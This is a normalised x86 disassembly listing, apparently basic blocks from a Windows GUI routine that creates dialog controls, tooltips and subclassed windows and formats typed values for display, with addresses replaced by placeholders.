mov eax [ esp + 0x28 ]
push eax
call [ GetTextExtentPoint32A@IAT ]
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x2c ]
add eax 0x4
cmp edx ecx
mov [ esp + 0x3c ] eax
jge r-xdata
lea eax [ esp + 0x48 ]
mov ecx [ eax + ebx + 0x40 ]
cmp [ ecx + edi ] 0x69
jne r-xdata
mov eax [ eax + ebx + 0x50 ]
cmp [ eax + esi ] 0x69
jne r-xdata
cmp ecx 0x1
jne r-xdata
cmp bx 0x5
mov [ rw-data ] 0x1
jne r-xdata
mov [ esp + 0x74 ] ecx
mov eax edx
dec eax
mov [ esp + 0x74 ] eax
jmp r-xdata
inc eax
mov [ esp + 0x74 ] eax
jmp r-xdata
mov ecx [ esp + 0x74 ]
sub ecx eax
cmp ecx esi
mov [ esp + 0x74 ] ecx
jge r-xdata
mov eax 0x1
mov ecx [ esp + 0x74 ]
add ecx eax
cmp ecx esi
mov [ esp + 0x74 ] ecx
jle r-xdata
mov eax 0x1
push 0x3f0
push 0xfffffff8
push edi
call ebp
push eax
call [ GetDlgItem@IAT ]
push eax
call [ SetWindowTextA@IAT ]
jmp r-xdata
shl ebp 0x4
mov ebx [ ebp + rw-data ]
lea esi [ esi + esi * 4 ]
shl esi 0x5
lea ecx [ esi + ebx + 0x3c ]
call sub_40af20
add eax 0x1f3
cmp edi eax
ja r-xdata
mov ebx [ esp + 0x10428 ]
mov eax [ esp + 0x10428 ]
add edi 0xfffffed4
shr eax 0x10
cmp eax 0x300
mov [ esp + 0x1c ] edi
jne r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x10420 ]
push 0x0
push ecx
mov ecx [ esp + 0x3c ]
push 0x0
push edx
mov edx [ esp + 0x3c ]
push ecx
mov ecx [ esp + 0x34 ]
push edx
push ecx
push 0x0
push 0x5000010b
push eax
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
mov esi [ esp + 0x14 ]
cmp esi 0x5
mov ebp eax
je r-xdata
lea eax [ esp + 0x48 ]
mov eax r--data
lea edx [ eax + 0x1 ]
mov eax r--data
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov eax r--data
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov eax r--data
lea edx [ eax + 0x1 ]
mov eax r--data
lea edx [ eax + 0x1 ]
cmp [ esp + 0x34 ] eax
jge r-xdata
mov edx ecx
mov [ esp + 0x2c ] edx
mov ecx [ ebx + eax + 0x40 ]
cmp [ edi + ecx ] 0x62
jne r-xdata
mov eax [ eax + ebx + 0x50 ]
mov ecx [ eax + esi + 0x4 ]
test ecx ecx
je r-xdata
fld [ eax + esi + 0x4 ]
fild [ eax + esi + 0x4 ]
jmp r-xdata
mov eax [ esp + 0x20 ]
add ebp 0x14
inc eax
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x1c ]
add edi 0x2
add esi 0x8
dec eax
mov [ esp + 0x2c ] ebp
mov [ esp + 0x24 ] edi
mov [ esp + 0x10 ] esi
mov [ esp + 0x1c ] eax
jne r-xdata
push sub_40ba70
push sub_40bbc0
push 0x5
push 0x24
lea ecx [ esp + 0x140 ]
xor edi edi
mov esi 0x1c
push ecx
mov [ esp + 0x58 ] esi
mov [ esp + 0x5c ] 0x7
mov [ esp + 0x60 ] edi
call sub_4b6874
mov [ esp + 0x10418 ] 0x1
lea ebp [ esp + 0x154 ]
jmp r-xdata
push sub_40ba70
push sub_40bbc0
push 0x4
push 0x24
lea eax [ esp + 0x140 ]
push eax
call sub_4b6874
mov ebp [ esp + 0x10 ]
lea ebp [ ebp + ebp * 4 ]
mov [ esp + 0x10418 ] 0xa
shl ebp 0x2
mov esi 0x1c
lea ebx [ esp + 0x154 ]
lea esp [ esp ]
mov [ rw-data ] 0x2
mov [ esp + 0x74 ] esi
jmp r-xdata
mov [ esp + 0x74 ] esi
jmp r-xdata
mov eax [ esi + ebx + 0x90 ]
lea ebp [ edi - 0x1f4 ]
lea ebx [ ebp + ebp * 4 ]
shl ebx 0x2
mov eax [ ebx + eax ]
cmp eax 0x3
jne r-xdata
cmp [ rw-data ] 0x2
je r-xdata
cmp esi 0x2
je r-xdata
test esi esi
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x4c ]
call sub_401cc0
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x4c ]
call sub_401cc0
mov edx [ rw-data ]
shl edx 0x4
mov eax [ edx + rw-data ]
mov ecx [ ebx + eax + 0x50 ]
cmp [ ecx + edi * 8 ] 0x76
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x4c ]
call sub_401cc0
mov eax [ rw-data ]
shl eax 0x4
mov eax [ eax + rw-data ]
mov ecx [ ebx + eax + 0x50 ]
cmp [ ecx + edi * 8 ] 0x76
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x4c ]
call sub_401cc0
mov eax [ rw-data ]
shl eax 0x4
mov eax [ eax + rw-data ]
mov ecx [ ebx + eax + 0x50 ]
cmp [ ecx + edi * 8 ] 0x76
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x4c ]
call sub_401cc0
mov eax [ rw-data ]
shl eax 0x4
mov eax [ eax + rw-data ]
mov ecx [ ebx + eax + 0x50 ]
cmp [ ecx + edi * 8 ] 0x76
je r-xdata
cmp [ esp + 0x28 ] edx
jge r-xdata
mov [ esp + 0x34 ] eax
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x10420 ]
push 0x0
add edx 0x64
push edx
push eax
mov eax [ ebx + eax + 0x50 ]
cmp [ esi + eax + 0x4 ] 0x1
jne r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x10420 ]
push 0x1
add eax 0x64
push eax
push ecx
jmp r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x10420 ]
push 0x1
add eax 0x64
push eax
push ecx
jmp r-xdata
fcomp [ r--data ]
fnstsw ax
test ah 0x44
jpe r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ esp + 0x2c ]
shl edx 0x4
mov eax [ edx + rw-data ]
mov eax [ ebx + eax + 0x90 ]
mov eax [ ecx + eax + 0x8 ]
push 0xffffffff
add eax esi
push edi
push eax
lea ecx [ esp + 0xa4 ]
mov [ esp + 0xbc ] 0xf
mov [ esp + 0xb8 ] edi
mov [ esp + 0xa8 ] 0x0
call sub_401dd0
mov edx [ rw-data ]
mov eax [ esp + 0x28 ]
push edx
push eax
lea ecx [ esp + 0xa0 ]
push ecx
mov [ esp + 0x10424 ] 0x2
call sub_40e460
mov eax [ esp + 0xbc ]
add esp 0xc
cmp eax 0x10
mov eax [ esp + 0x9c ]
jae r-xdata
push eax
lea ecx [ esp + 0x3e8 ]
call j_sub_44f660
push ebx
lea ecx [ esp + 0x3e8 ]
call sub_439260
cmp [ esp + 0x5c ] 0x10
mov [ esp + 0x10418 ] 0xa
jb r-xdata
lea eax [ esp + 0x48 ]
mov edi [ esp + 0x1042c ]
push 0x0
push 0x0
push 0xf0
push edi
call [ SendMessageA@IAT ]
test eax eax
setne al
xor ebx ebx
test al al
sete bl
push 0x0
mov [ esp + 0x37 ] al
push ebx
push 0xf1
push edi
call [ SendMessageA@IAT ]
mov ecx [ rw-data ]
mov edx ecx
shl edx 0x4
mov eax [ edx + rw-data ]
mov edx [ esi + eax + 0x40 ]
cmp [ edx + ebp * 2 ] 0x62
jne r-xdata
lea ecx [ esp + 0xd8 ]
call sub_40bbc0
mov edx [ rw-data ]
shl edx 0x4
mov eax [ edx + rw-data ]
mov eax [ esi + eax + 0x90 ]
mov eax [ ebx + eax + 0x8 ]
add eax 0x38
push eax
lea ecx [ esp + 0xb8 ]
mov [ esp + 0x1041c ] 0xf
call sub_401fc0
mov eax [ rw-data ]
mov ecx [ esp + 0x10 ]
push eax
push ecx
lea edx [ esp + 0xbc ]
push edx
mov [ esp + 0x10424 ] 0x10
call sub_40e460
add esp 0xc
lea ecx [ esp + 0xb4 ]
call sub_4010a0
push eax
lea ecx [ esp + 0x3e8 ]
call j_sub_44f660
lea eax [ esp + 0xd8 ]
push eax
lea ecx [ esp + 0x3e8 ]
call sub_439260
lea ecx [ esp + 0xd8 ]
call sub_40b1a0
mov ecx [ rw-data ]
shl ecx 0x4
mov ebx [ ecx + rw-data ]
lea ecx [ esi + ebx + 0x3c ]
mov [ esp + 0x1c ] eax
mov edi 0x1
call sub_40af20
cmp eax edi
jle r-xdata
mov [ esp + 0x94 ] 0xf
mov [ esp + 0x90 ] 0x0
mov [ esp + 0x80 ] 0x0
mov esi [ esp + 0x1042c ]
mov ebp [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0xe
push esi
mov [ esp + 0x10428 ] 0xc
call ebp
push eax
lea ecx [ esp + 0x80 ]
call sub_401f60
lea ecx [ esp + 0x7c ]
call sub_4010a0
mov edx [ esp + 0x90 ]
push eax
inc edx
push edx
push 0xd
push esi
call ebp
mov eax [ rw-data ]
mov ecx edi
imul ecx ecx 0x1c
shl eax 0x4
mov eax [ eax + rw-data ]
mov eax [ ebx + eax + 0x70 ]
lea edx [ esp + 0x7c ]
add ecx eax
push edx
call sub_401ff0
mov eax [ rw-data ]
mov ecx [ esp + 0x10 ]
cmp eax 0x4
setne al
push 0x1
push eax
push edi
push ecx
call sub_40ef30
mov eax [ rw-data ]
add esp 0x10
cmp eax 0x1
je r-xdata
mov ebp [ esp + 0x2c ]
xor esi esi
mov [ esp + 0x10 ] 0x1
cmp esi 0x3
je r-xdata
mov edx [ rw-data ]
mov ecx [ esp + 0x40 ]
shl edx 0x4
mov eax [ edx + rw-data ]
mov eax [ ebx + eax + 0x90 ]
mov eax [ eax + ecx + 0x8 ]
cmp [ eax + 0x6c ] 0x10
jb r-xdata
cmp esi 0x1
jne r-xdata
mov eax ecx
mov cl [ eax + edi * 8 + 0x4 ]
test cl cl
lea ecx [ esp + 0x7c ]
je r-xdata
mov eax ecx
mov eax [ eax + edi * 8 + 0x4 ]
push eax
lea ecx [ esp + 0x1e8 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0xc
lea edx [ esp + 0x1e4 ]
push edx
lea ecx [ esp + 0x80 ]
call sub_402510
jmp r-xdata
mov eax ecx
cmp [ eax + edi * 8 ] 0x69
jne r-xdata
mov eax [ ebx + eax + 0x60 ]
push 0xffffffff
add eax esi
push 0x0
push eax
lea ecx [ esp + 0x88 ]
call sub_401dd0
cmp [ esp + 0x5c ] 0x10
mov [ esp + 0x10418 ] 0x0
jb r-xdata
mov [ esp + 0x28 ] edx
call [ CheckDlgButton@IAT ]
push eax
lea ecx [ esp + 0x3e8 ]
call j_sub_44f660
push ebp
lea ecx [ esp + 0x3e8 ]
call sub_439260
cmp [ esp + 0xb0 ] 0x10
mov [ esp + 0x10418 ] 0x1
jb r-xdata
lea eax [ esp + 0x9c ]
add esi 0x1c
add ebx 0x24
cmp esi 0x54
mov [ esp + 0x5c ] 0xf
mov [ esp + 0x58 ] 0x0
mov [ esp + 0x48 ] 0x0
jle r-xdata
mov edx [ esp + 0x48 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov edx [ esi + eax + 0x40 ]
cmp [ edx + ebp * 2 ] 0x69
jne r-xdata
mov cl [ esp + 0x33 ]
test cl cl
sete cl
mov [ esp + 0x38 ] 0x62
mov [ esp + 0x3c ] cl
mov eax [ esi + eax + 0x50 ]
lea edx [ esp + 0x38 ]
mov [ esp + 0x10418 ] 0x14
lea ecx [ eax + ebp * 8 ]
push edx
jmp r-xdata
mov eax [ esp + 0x1042c ]
push 0x0
push 0x1
push 0xf1
push eax
call [ SendMessageA@IAT ]
mov [ esp + 0x38 ] 0x62
mov [ esp + 0x3c ] 0x1
mov ecx [ rw-data ]
shl ecx 0x4
mov eax [ ecx + rw-data ]
mov eax [ esi + eax + 0x50 ]
lea edx [ esp + 0x38 ]
lea ecx [ eax + ebp * 8 ]
push edx
mov [ esp + 0x1041c ] 0x13
call sub_40b0b0
lea ecx [ esp + 0x38 ]
mov [ esp + 0x10418 ] 0x10
call sub_40b090
imul ebp ebp 0x1c
mov eax [ rw-data ]
shl eax 0x4
mov eax [ eax + rw-data ]
mov eax [ esi + eax + 0x70 ]
add ebp eax
push r--data
mov ecx ebp
call sub_402510
lea ecx [ esp + 0xb4 ]
call sub_4480e0
lea ecx [ esp + 0xd8 ]
call sub_40ba70
jmp r-xdata
mov [ esp + 0x18 ] 0x1c
mov [ esp + 0x14 ] 0x14
lea ebx [ ebx ]
lea ecx [ esp + 0x7c ]
call sub_4480e0
jmp r-xdata
mov edx [ esp + 0x10420 ]
add edi 0x190
push edi
push edx
mov [ rw-data ] 0x3
call [ GetDlgItem@IAT ]
test eax eax
mov [ esp + 0x14 ] eax
je r-xdata
mov esi 0xf
cmp ecx 0x2
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
mov ebp 0x1
mov esi 0x78
mov [ esp + 0x10 ] ebp
jne r-xdata
add eax 0x58
mov eax [ eax + 0x58 ]
jmp r-xdata
cmp esi 0x2
jne r-xdata
mov edx [ rw-data ]
mov ecx [ esp + 0x40 ]
shl edx 0x4
mov eax [ edx + rw-data ]
mov eax [ ebx + eax + 0x90 ]
mov eax [ eax + ecx + 0x8 ]
cmp [ eax + 0xa4 ] 0x10
jb r-xdata
push r--data
call sub_402510
jmp r-xdata
push r--data
call sub_402510
jmp r-xdata
fld [ eax + edi * 8 + 0x4 ]
fild [ eax + edi * 8 + 0x4 ]
jmp r-xdata
mov [ esp + 0x5c ] 0xf
mov [ esp + 0x58 ] 0x0
mov [ esp + 0x48 ] 0x0
mov ecx [ esp + 0x48 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
add esi 0x1c
add ebp 0x24
cmp esi 0x70
mov [ esp + 0xb0 ] 0xf
mov [ esp + 0xac ] edi
mov [ esp + 0x9c ] 0x0
jle r-xdata
mov edx [ esp + 0x9c ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ rw-data ]
shl ecx 0x4
mov eax [ ecx + rw-data ]
mov eax [ eax + edi + 0x90 ]
mov eax [ eax + ebp + 0x8 ]
push 0xffffffff
add eax esi
push 0x0
push eax
lea ecx [ esp + 0x50 ]
mov [ esp + 0x68 ] 0xf
mov [ esp + 0x64 ] 0x0
mov [ esp + 0x54 ] 0x0
call sub_401dd0
mov edx [ rw-data ]
mov eax [ esp + 0x1c ]
push edx
push eax
lea ecx [ esp + 0x4c ]
push ecx
mov [ esp + 0x10424 ] 0xb
call sub_40e460
mov eax [ esp + 0x68 ]
add esp 0xc
cmp eax 0x10
mov eax [ esp + 0x48 ]
jae r-xdata
lea ecx [ esp + 0x154 ]
call sub_40b200
fstp [ esp + 0x14 ]
fild [ esp + 0x6c ]
lea ecx [ esp + 0x178 ]
fstp [ esp + 0x18 ]
call sub_40b200
fsub [ esp + 0x14 ]
mov eax [ rw-data ]
mov esi [ esp + 0x10 ]
fdiv [ esp + 0x18 ]
shl eax 0x4
mov eax [ eax + rw-data ]
mov edi [ eax + edi + 0x40 ]
cmp [ edi + esi * 2 ] 0x69
fmul [ esp + 0x18 ]
fadd [ esp + 0x14 ]
fsub [ esp + 0x14 ]
fimul [ esp + 0x74 ]
fdiv [ esp + 0x18 ]
fadd [ esp + 0x14 ]
fstp [ esp + 0x1c ]
jne r-xdata
mov al [ esp + 0x33 ]
imul ebp ebp 0x1c
shl ecx 0x4
test al al
mov ecx [ ecx + rw-data ]
jne r-xdata
mov [ esp + 0x38 ] 0x69
mov [ esp + 0x3c ] ebx
mov eax [ esi + eax + 0x50 ]
lea ecx [ eax + ebp * 8 ]
lea eax [ esp + 0x38 ]
mov [ esp + 0x10418 ] 0x15
push eax
call sub_40b0b0
lea ecx [ esp + 0x38 ]
mov [ esp + 0x10418 ] 0x0
call sub_40b090
mov ecx [ rw-data ]
mov ecx [ rw-data ]
shl ecx 0x4
mov eax [ ecx + rw-data ]
mov cl [ eax + esi + 0x4 ]
mov eax [ esp + 0x10 ]
xor edx edx
test cl cl
mov ecx [ esp + 0x10420 ]
sete dl
push edx
push eax
push 0x4cd
push 0xfffffff8
push ecx
call [ GetWindowLongA@IAT ]
jmp r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ rw-data ]
mov eax [ esp + 0x18 ]
add ecx 0x14
shl edx 0x4
mov ebx [ edx + rw-data ]
mov [ esp + 0x14 ] ecx
add eax 0x1c
lea ecx [ esi + ebx + 0x3c ]
inc edi
mov [ esp + 0x18 ] eax
call sub_40af20
cmp edi eax
jl r-xdata
mov eax [ esi + ebx + 0x90 ]
mov edx [ esp + 0x14 ]
cmp [ edx + eax ] 0x3
jne r-xdata
mov [ rw-data ] 0x0
push sub_40ba70
push sub_40bbc0
push 0x4
push 0x24
lea eax [ esp + 0x140 ]
push eax
call sub_4b6874
mov edi [ esp + 0x1c ]
lea edi [ edi + edi * 4 ]
mov [ esp + 0x10418 ] 0xd
shl edi 0x2
mov esi 0x1c
lea ebp [ esp + 0x154 ]
mov edi edi
cmp [ esp + 0x5c ] 0x10
mov [ esp + 0x94 ] esi
mov [ esp + 0x90 ] 0x0
mov [ esp + 0x80 ] 0x0
mov [ esp + 0x10418 ] 0x0
jb r-xdata
mov edx [ esp + 0x80 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov ecx 0xf
mov [ esp + 0xf8 ] ecx
mov [ esp + 0xf4 ] 0x0
mov [ esp + 0xe4 ] 0x0
mov [ esp + 0xd8 ] 0x76
mov edx [ esp + 0x40 ]
shl eax 0x4
mov eax [ eax + rw-data ]
mov eax [ ebx + eax + 0x90 ]
mov eax [ eax + edx + 0x8 ]
push 0xffffffff
add eax 0x1c
push 0x0
mov [ esp + 0xb8 ] ecx
push eax
lea ecx [ esp + 0xa4 ]
mov [ esp + 0x10424 ] 0x8
mov [ esp + 0xb8 ] 0x0
mov [ esp + 0xa8 ] 0x0
call sub_401dd0
mov eax [ rw-data ]
mov ecx [ esp + 0x10428 ]
push eax
push ecx
lea edx [ esp + 0xa0 ]
push edx
mov [ esp + 0x10424 ] 0x9
call sub_40e460
mov eax [ esp + 0xbc ]
add esp 0xc
cmp eax 0x10
mov eax [ esp + 0x9c ]
jae r-xdata
cmp ecx 0x3
je r-xdata
mov ecx [ esp + 0x2c ]
lea eax [ esi + ecx ]
cmp [ esp + 0x28 ] eax
jge r-xdata
push sub_40ba70
push sub_40bbc0
push 0x4
push 0x24
lea ecx [ esp + 0x140 ]
push ecx
call sub_4b6874
mov [ esp + 0x10418 ] 0x6
mov esi 0x1c
lea ebp [ esp + 0x154 ]
mov edi edi
push eax
call [ lstrlenA@IAT ]
test eax eax
jle r-xdata
test eax eax
mov [ esp + 0x24 ] eax
je r-xdata
cmp esi 0x3
jne r-xdata
mov edx [ rw-data ]
mov ecx [ esp + 0x40 ]
shl edx 0x4
mov eax [ edx + rw-data ]
mov eax [ ebx + eax + 0x90 ]
mov eax [ eax + ecx + 0x8 ]
cmp [ eax + 0x50 ] 0x10
jb r-xdata
add eax 0x90
jmp r-xdata
mov eax [ eax + 0x90 ]
jmp r-xdata
sub esp 0x8
fstp [ esp ]
lea ecx [ esp + 0x2ec ]
push r--data
push ecx
call sub_4b675e
add esp 0x10
lea edx [ esp + 0x2e4 ]
push edx
lea ecx [ esp + 0x80 ]
call sub_402510
jmp r-xdata
lea ecx [ esp + 0x19c ]
call sub_40b200
fstp [ esp + 0x18 ]
lea ecx [ esp + 0x1c0 ]
call sub_40b1a0
lea ecx [ esp + 0x178 ]
mov esi eax
call sub_40b200
fstp [ esp + 0x40 ]
lea ecx [ esp + 0x154 ]
call sub_40b200
fstp [ esp + 0x34 ]
cmp esi edi
jle r-xdata
fld [ esp + 0x1c ]
sub esp 0x8
fstp [ esp ]
lea eax [ esp + 0x1ec ]
push r--data
push eax
call sub_4b675e
add esp 0x10
lea ecx [ esp + 0x1e4 ]
push ecx
call [ lstrlenA@IAT ]
dec eax
js r-xdata
mov ecx [ esp + 0x1c ]
push ecx
call sub_452500
push eax
lea edx [ esp + 0x1ec ]
push r--data
push edx
call sub_4b675e
add esp 0x10
jmp r-xdata
mov ecx [ ecx + esi + 0x70 ]
push r--data
mov ecx [ esi + ecx + 0x70 ]
push r--data
jmp r-xdata
push eax
cmp edi ebp
je r-xdata
mov ebx eax
mov eax edx
mov ebx [ eax + ebx + 0x8 ]
lea eax [ ebx + 0x38 ]
push eax
lea ecx [ esp + 0x80 ]
call sub_401fc0
mov ecx [ rw-data ]
mov edx [ esp + 0x10 ]
push ecx
push edx
lea eax [ esp + 0x84 ]
push eax
mov [ esp + 0x10424 ] 0x11
call sub_40e460
add esp 0xc
lea ecx [ esp + 0x7c ]
call sub_4010a0
push eax
lea ecx [ esp + 0x3e8 ]
call j_sub_44f660
lea ecx [ esp + 0xd8 ]
push ecx
lea ecx [ esp + 0x3e8 ]
call sub_439260
lea ecx [ esp + 0xd8 ]
call sub_40b1a0
cmp eax [ esp + 0x1c ]
jne r-xdata
mov ecx [ rw-data ]
shl ecx 0x4
mov eax [ ecx + rw-data ]
mov eax [ ebx + eax + 0x90 ]
mov eax [ edi + eax + 0x8 ]
add eax esi
push eax
lea ecx [ esp + 0xb8 ]
call sub_401fc0
mov edx [ rw-data ]
mov eax [ esp + 0x10 ]
push edx
push eax
lea ecx [ esp + 0xbc ]
push ecx
mov [ esp + 0x10424 ] 0xe
call sub_40e460
add esp 0xc
lea ecx [ esp + 0xb4 ]
call sub_4010a0
push eax
lea ecx [ esp + 0x3e8 ]
call j_sub_44f660
push ebp
lea ecx [ esp + 0x3e8 ]
call sub_439260
lea ecx [ esp + 0xb4 ]
mov [ esp + 0x10418 ] 0xd
call sub_4480e0
add esi 0x1c
add ebp 0x24
cmp esi 0x54
jle r-xdata
lea ecx [ esp + 0x154 ]
call sub_40b200
fstp [ esp + 0x10 ]
lea ecx [ esp + 0x19c ]
call sub_40b200
fst [ esp + 0x18 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x44
jpe r-xdata
mov ebp [ esp + 0x10420 ]
mov [ esp + 0x5c ] esi
mov [ esp + 0x58 ] 0x0
mov [ esp + 0x48 ] 0x0
mov eax [ esp + 0x48 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov edx [ esp + 0xac ]
lea ecx [ esp + 0xd0 ]
push ecx
push edx
push eax
mov eax [ esp + 0x28 ]
push eax
call [ GetTextExtentPoint32A@IAT ]
mov ecx [ esp + 0xd0 ]
add ecx 0x14
lea edx [ ecx + esi ]
lea eax [ edx + ebp ]
cmp [ esp + 0x28 ] eax
mov [ esp + 0xd0 ] ecx
jge r-xdata
lea eax [ esp + 0x9c ]
cmp ecx 0x1
jne r-xdata
cmp ebp 0x1
mov ecx 0x50810080
jle r-xdata
mov [ esp + 0x28 ] eax
push eax
lea ecx [ esp + 0x3e8 ]
call j_sub_44f660
push ebp
lea ecx [ esp + 0x3e8 ]
call sub_439260
cmp [ esp + 0xcc ] 0x10
mov [ esp + 0x10418 ] 0x6
jb r-xdata
lea eax [ esp + 0xb8 ]
push sub_40acd0
push 0xfffffffc
push ebp
call [ SetWindowLongA@IAT ]
push 0x0
push 0xfffffffa
push ebp
mov [ rw-data ] eax
call [ GetWindowLongA@IAT ]
push eax
push 0x0
push ebp
push 0x80000000
push 0x80000000
push 0x80000000
push 0x80000000
push 0x3
push 0x0
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
mov esi eax
xor eax eax
mov ecx 0xb
lea edi [ esp + 0x104 ]
[ edi ]
push esi
mov [ esp + 0x108 ] 0x2c
mov [ esp + 0x10c ] 0x1
call [ GetParent@IAT ]
mov edx [ esp + 0x24 ]
mov edi [ SendMessageA@IAT ]
mov [ esp + 0x10c ] eax
lea eax [ esp + 0x104 ]
push eax
push 0x0
push 0x404
push esi
mov [ esp + 0x120 ] ebp
mov [ esp + 0x138 ] edx
call edi
push 0x258
push 0x0
push 0x418
push esi
call edi
push esi
push 0xffffffeb
push ebp
call [ SetWindowLongA@IAT ]
mov edi [ esp + 0x10 ]
mov esi [ esp + 0x14 ]
add eax 0x3c
jmp r-xdata
mov eax [ eax + 0x3c ]
jmp r-xdata
fld [ esp + 0x18 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x44
jpe r-xdata
mov eax esi
mov [ esp + 0x50 ] eax
jmp r-xdata
test eax eax
mov ecx eax
jl r-xdata
mov cl 0x30
mov eax [ esp + 0x10420 ]
lea edx [ esp + 0x1e4 ]
push edx
push 0x0
push 0xc
add esi 0x12c
push esi
push eax
call [ GetDlgItem@IAT ]
push eax
call [ SendMessageA@IAT ]
push sub_40ba70
push 0x4
push 0x24
lea ecx [ esp + 0x13c ]
push ecx
mov [ rw-data ] 0x0
mov [ esp + 0x10428 ] 0x0
call sub_4b6814
jmp r-xdata
add ebp ecx
mov ecx ebp
call sub_402510
lea ecx [ esp + 0x7c ]
mov [ esp + 0x10418 ] 0x10
call sub_4480e0
mov edx [ esp + 0x10420 ]
push 0x0
push 0x0
push 0xf0
lea ebx [ edi + 0x1f4 ]
push ebx
push edx
call [ GetDlgItem@IAT ]
push eax
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
mov edi [ esp + 0x14 ]
lea edx [ esp + 0x44 ]
push edx
push 0x2
push edi
mov [ esp + 0x50 ] 0x1c
mov [ esp + 0x54 ] 0x5
call [ GetScrollInfo@IAT ]
mov eax [ rw-data ]
mov ecx [ esp + 0x1c ]
shl eax 0x4
mov eax [ eax + rw-data ]
mov ebx [ ebx + eax + 0x50 ]
cmp [ ebx + ecx * 8 ] 0x69
lea esi [ ebx + ecx * 8 ]
jne r-xdata
mov [ esp + 0x18 ] 0x3f800000
mov ebp [ esp + 0x14 ]
mov edx [ esp + 0xb0 ]
xor eax eax
cmp ebp 0x3
sete al
cmp edx 0x10
mov edx [ esp + 0x9c ]
lea eax [ eax + eax + 0x2 ]
jae r-xdata
mov [ esp + 0x28 ] eax
mov ecx [ esp + 0x28 ]
lea eax [ esi + ebp + 0xa0 ]
cmp ecx eax
jge r-xdata
mov eax [ rw-data ]
mov edx [ esp + 0x38 ]
shl eax 0x4
mov eax [ eax + rw-data ]
mov eax [ ebx + eax + 0x70 ]
cmp [ eax + edx + 0x18 ] 0x10
mov [ rw-data ] 0x4
jb r-xdata
mov ecx 0x50a110c4
add esi 0x1c
add ebp 0x24
cmp esi 0x38
mov [ esp + 0xcc ] 0xf
mov [ esp + 0xc8 ] 0x0
mov [ esp + 0xb8 ] 0x0
jle r-xdata
mov edx [ esp + 0xb8 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
fld [ esp + 0x40 ]
push ecx
fsub [ esp + 0x38 ]
fdiv [ esp + 0x1c ]
fstp [ esp ]
call sub_452500
add esp 0x4
xor eax eax
jmp r-xdata
cmp eax edi
mov ebp [ GetDlgItem@IAT ]
mov esi [ esp + 0x20 ]
jg r-xdata
lea eax [ esp + eax + 0x1e4 ]
mov dl 0x2e
nop
dec eax
jns r-xdata
mov eax [ esp + 0x10420 ]
push 0x0
push 0x0
push 0xf1
push ebx
push eax
call [ GetDlgItem@IAT ]
push eax
call [ SendMessageA@IAT ]
mov [ esp + 0x38 ] 0x62
mov [ esp + 0x3c ] 0x0
mov ecx [ rw-data ]
shl ecx 0x4
mov eax [ ecx + rw-data ]
mov eax [ esi + eax + 0x50 ]
lea edx [ esp + 0x38 ]
lea ecx [ eax + edi * 8 ]
push edx
mov [ esp + 0x1041c ] 0x12
call sub_40b0b0
lea ecx [ esp + 0x38 ]
mov [ esp + 0x10418 ] 0x11
call sub_40b090
mov eax [ rw-data ]
mov ecx [ esp + 0x18 ]
shl eax 0x4
mov eax [ eax + rw-data ]
mov eax [ esi + eax + 0x70 ]
add ecx eax
push r--data
call sub_402510
mov ecx esi
call sub_40a3e0
test al al
je r-xdata
mov edx [ esi + 0x4 ]
mov [ esp + 0x58 ] edx
jmp r-xdata
mov ebp [ esp + 0x18 ]
push 0x0
push ebp
lea ebp [ edi + 0x1f4 ]
push ebp
mov ebp [ esp + 0x1042c ]
push ebp
mov ebp [ esp + 0xe4 ]
push ebp
push ecx
mov ecx [ esp + 0x38 ]
add ecx 0x3
push ecx
mov ecx [ esp + 0x48 ]
add esi ecx
push esi
or eax 0x50000000
push eax
push edx
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
mov edx [ esp + 0x10420 ]
push 0x0
push edi
push 0x4ca
push edx
call [ SendMessageA@IAT ]
mov eax [ esp + 0xb0 ]
mov ebp 0x10
cmp eax ebp
jb r-xdata
lea edx [ esp + 0x9c ]
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x10420 ]
push 0x0
push eax
mov eax [ esp + 0x3c ]
lea ecx [ edi + 0x190 ]
push ecx
push edx
add eax 0xfffffff0
cdq
push 0x10
sub eax edx
mov edx [ esp + 0x34 ]
push 0xa0
sar eax 0x1
add eax edx
push eax
add esi ebp
push esi
push 0x50000000
push r--data
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
mov eax [ esp + 0x10420 ]
push 0x0
push edi
push 0x4ca
push eax
call [ SendMessageA@IAT ]
mov [ esp + 0x28 ] eax
lea eax [ eax + edx + 0x4 ]
mov eax [ eax + edx + 0x4 ]
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ esp + 0x40 ]
shl edx 0x4
mov eax [ edx + rw-data ]
mov eax [ ebx + eax + 0x90 ]
